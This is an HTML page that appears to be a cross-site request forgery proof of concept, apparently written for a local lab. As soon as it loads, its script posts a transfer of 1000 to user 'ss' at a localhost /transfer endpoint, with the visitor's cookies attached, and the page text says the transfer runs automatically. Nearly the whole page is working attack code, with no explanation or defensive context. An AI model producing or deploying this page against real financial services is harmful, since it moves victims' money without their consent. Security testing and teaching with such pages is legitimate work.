<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transfer Money</title>
    <script>
        document.addEventListener('DOMContentLoaded', (event) => {
            const transferMoney = async () => {
                try {
                    const response = await fetch('https://localhost:3000/transfer', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            recipientUsername: "ss",
                            amount: 1000
                        }),
                        credentials: 'include' // Ensure cookies are sent and accepted
                    });

                    if (!response.ok) {
                        throw new Error('Network response was not ok ' + response.statusText);
                    }

                    const data = await response.json();
                    console.log('Transfer successful:', data);
                } catch (error) {
                    console.error('Transfer failed:', error);
                }
            };

            // Call the function on load
            transferMoney();
        });
    </script>
</head>
<body>
    <h1>Transfer Money</h1>
    <p>The transfer will be performed automatically when the page loads.</p>
</body>
</html>
